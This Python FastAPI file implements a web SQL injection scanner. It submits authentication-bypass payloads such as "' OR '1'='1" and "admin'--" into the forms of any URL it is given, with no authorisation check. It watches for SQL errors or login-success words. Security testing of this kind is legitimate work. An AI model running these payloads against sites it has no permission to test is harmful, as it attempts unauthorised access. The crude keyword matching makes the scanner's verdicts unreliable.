from fastapi import FastAPI, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, HttpUrl
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import asyncio
from typing import List, Dict, Any
import uvicorn

app = FastAPI(title="SQL Injection Scanner", description="Web-based SQL Injection Vulnerability Scanner")

# Serve static files (HTML, CSS, JS)
app.mount("/static", StaticFiles(directory="static"), name="static")

# Request model
class ScanRequest(BaseModel):
    url: HttpUrl

# Response models
class InputField(BaseModel):
    type: str
    name: str
    value: str

class FormDetails(BaseModel):
    action: str
    method: str
    inputs: List[InputField]

class VulnerabilityResult(BaseModel):
    form_action: str
    payload: str
    vulnerable: bool
    response_indicators: List[str]

class ScanResult(BaseModel):
    url: str
    total_forms: int
    vulnerabilities: List[VulnerabilityResult]
    scan_completed: bool
    error_message: str = None

class SQLInjectionScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/137.0.0.0 Safari/537.36"
    
    def get_forms(self, url: str):
        """Get all forms from a page"""
        try:
            response = self.session.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Failed to fetch URL: {str(e)}")
    
    def form_details(self, form) -> FormDetails:
        """Extract details from a form"""
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        inputs = []
        
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name", "")
            input_value = input_tag.attrs.get("value", "")
            inputs.append(InputField(
                type=input_type,
                name=input_name,
                value=input_value
            ))
        
        return FormDetails(
            action=action,
            method=method,
            inputs=inputs
        )
    
    def check_vulnerability(self, response) -> tuple[bool, List[str]]:
        """Check for SQL errors or success indicators in response"""
        sql_errors = {
            "you have an error in your sql syntax",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "warning: mysql",
            "syntax error"
        }
        
        success_indicators = ["logout", "dashboard", "welcome", "admin panel", "logged in"]
        
        content = response.content.decode(errors="ignore").lower()
        found_indicators = []
        
        for error in sql_errors:
            if error in content:
                found_indicators.append(f"SQL Error: {error}")
        
        for indicator in success_indicators:
            if indicator in content:
                found_indicators.append(f"Success indicator: {indicator}")
        
        return len(found_indicators) > 0, found_indicators
    
    async def scan_url(self, url: str) -> ScanResult:
        """Main scanning function"""
        try:
            forms = self.get_forms(url)
            vulnerabilities = []
            
            for form in forms:
                details = self.form_details(form)
                target_url = urljoin(url, details.action or url)
                
                # Test multiple payloads
                payloads = ["' OR '1'='1", '" OR "1"="1', "' OR 1=1--", "admin'--"]
                
                for payload in payloads:
                    data = {}
                    
                    for input_field in details.inputs:
                        if not input_field.name:
                            continue
                        
                        if input_field.type in ['text', 'password', 'email']:
                            data[input_field.name] = payload
                        elif input_field.type == 'hidden':
                            data[input_field.name] = input_field.value
                        elif input_field.type == 'submit':
                            data[input_field.name] = input_field.value
                        else:
                            data[input_field.name] = "test"
                    
                    try:
                        if details.method == "post":
                            response = self.session.post(target_url, data=data, timeout=10)
                        else:
                            response = self.session.get(target_url, params=data, timeout=10)
                        
                        is_vulnerable, indicators = self.check_vulnerability(response)
                        
                        if is_vulnerable:
                            vulnerabilities.append(VulnerabilityResult(
                                form_action=target_url,
                                payload=payload,
                                vulnerable=True,
                                response_indicators=indicators
                            ))
                            break  # Found vulnerability, no need to test other payloads for this form
                        
                    except Exception as e:
                        continue  # Skip failed requests
            
            return ScanResult(
                url=str(url),
                total_forms=len(forms),
                vulnerabilities=vulnerabilities,
                scan_completed=True
            )
            
        except Exception as e:
            return ScanResult(
                url=str(url),
                total_forms=0,
                vulnerabilities=[],
                scan_completed=False,
                error_message=str(e)
            )

# Initialize scanner
scanner = SQLInjectionScanner()

@app.get("/", response_class=HTMLResponse)
async def read_root():
    """Serve the main HTML page"""
    try:
        with open("static/index.html", "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    except FileNotFoundError:
        return HTMLResponse(content="""
        <html>
            <body>
                <h1>SQL Injection Scanner</h1>
                <p>Please create static/index.html file</p>
            </body>
        </html>
        """)

@app.post("/scan", response_model=ScanResult)
async def scan_endpoint(request: ScanRequest):
    """Endpoint to scan a URL for SQL injection vulnerabilities"""
    result = await scanner.scan_url(str(request.url))
    return result

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy"}

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)